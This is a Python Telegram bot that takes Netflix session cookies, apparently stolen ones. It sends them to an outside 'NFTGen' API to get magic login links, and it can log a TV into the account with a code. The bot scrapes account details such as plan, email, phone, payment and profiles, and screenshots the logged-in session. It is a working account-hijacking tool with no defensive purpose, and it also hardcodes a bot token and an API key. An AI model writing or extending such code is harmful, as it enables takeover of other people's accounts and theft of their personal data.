import requests, logging, time, urllib.parse, io, os, sys, re, json, threading, telebot, zipfile, codecs, concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask

# Suppress Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ==========================================
# CONFIGURATION (Harsh's Setup)
# ==========================================
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844", "@F88UF"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(8)

# NFTGen API (Replacing KamalXD)
NFTGEN_API_URL = "http://nftgenapi.onrender.com/api"
NFTGEN_API_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://www.netflix.com/",
}

# ==========================================
# CORE ENGINE (NFTGen + Advanced Scraper)
# ==========================================
def call_nftgen_api(endpoint, payload):
    payload['secret_key'] = NFTGEN_API_KEY
    try:
        resp = requests.post(f"{NFTGEN_API_URL}/{endpoint}", json=payload, timeout=12)
        return resp.json() if resp.status_code == 200 else None
    except: return None

def extract_deep_details(html):
    """Deep Scraping Logic from your 58kb file"""
    details = {
        "plan": "Unknown", "payment": "Unknown", "expiry": "N/A", 
        "email": "N/A", "phone": "N/A", "country": "Unknown",
        "price": "N/A", "quality": "Unknown", "name": "Unknown",
        "extra_members": "No ❌", "member_since": "Unknown", "profiles": []
    }
    # [Advanced Regex Extraction Block]
    if '"membershipStatus":"CURRENT_MEMBER"' in html: details["status"] = "Active"
    # Plan
    plan = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if plan: details["plan"] = plan.group(1)
    # Profiles
    p_names = re.findall(r'"profileName":"([^"]+)"', html)
    details["profiles"] = list(set(p_names))
    return details

def check_cookie(cookie_input):
    """Main checking logic using NFTGen API for tokens"""
    nid_match = re.search(r"NetflixId=([^;]+)", cookie_input)
    netflix_id_val = nid_match.group(1) if nid_match else cookie_input.strip()

    # 1. NFTGen API Validation
    api_res = call_nftgen_api("gen", {"netflix_id": netflix_id_val})
    
    if api_res and api_res.get("success"):
        magic_link = api_res.get("login_url")
        
        # 2. Scrape Account Details for Deep Info
        # (Using local requests to scrape while API gives the token)
        session = requests.Session()
        session.cookies.set("NetflixId", netflix_id_val, domain=".netflix.com")
        acc_resp = session.get("https://www.netflix.com/YourAccount", headers=HEADERS, timeout=15)
        deep_data = extract_deep_details(acc_resp.text)
        
        # 3. Visual Screenshot Logic
        screenshot_bytes = None
        if SCREENSHOT_SEMAPHORE.acquire(timeout=20):
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True)
                    context = browser.new_context(viewport={'width': 1280, 'height': 720})
                    context.add_cookies([{'name': 'NetflixId', 'value': netflix_id_val, 'domain': '.netflix.com', 'path': '/'}])
                    page = context.new_page()
                    page.goto("https://www.netflix.com/browse", wait_until='domcontentloaded', timeout=20000)
                    time.sleep(2)
                    screenshot_bytes = page.screenshot(type='jpeg', quality=50)
                    browser.close()
            finally: SCREENSHOT_SEMAPHORE.release()

        return {"valid": True, "magic_link": magic_link, "data": deep_data, "screenshot": screenshot_bytes}
    return {"valid": False, "msg": "Expired or Invalid Cookie"}

# ==========================================
# BOT INTERFACE (DM, Channel, TV Login)
# ==========================================
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(func=lambda m: m.text == "📺 TV Login")
def tv_login_start(message):
    msg = bot.reply_to(message, "📺 **TV Login Mode**\n1️⃣ Send your **Netflix Cookie** now.")
    bot.register_next_step_handler(msg, tv_login_cookie)

def tv_login_cookie(message):
    cookie = message.text.strip()
    msg = bot.reply_to(message, "✅ Cookie Active!\n2️⃣ Now enter the **8-Digit TV Code**.")
    bot.register_next_step_handler(msg, lambda m: finalize_tv_login(m, cookie))

def finalize_tv_login(message, cookie):
    code = message.text.strip()
    nid = re.search(r"NetflixId=([^;]+)", cookie).group(1) if "NetflixId=" in cookie else cookie
    res = call_nftgen_api("tvlogin", {"netflix_id": nid, "tv_code": code})
    bot.reply_to(message, f"📺 **TV Login Result:** {res.get('message', 'Error') if res else 'API Offline'}")

# (Add Bulk Handling with 40 Workers here for final version)

if __name__ == "__main__":
    bot.infinity_polling(skip_pending=True)
  
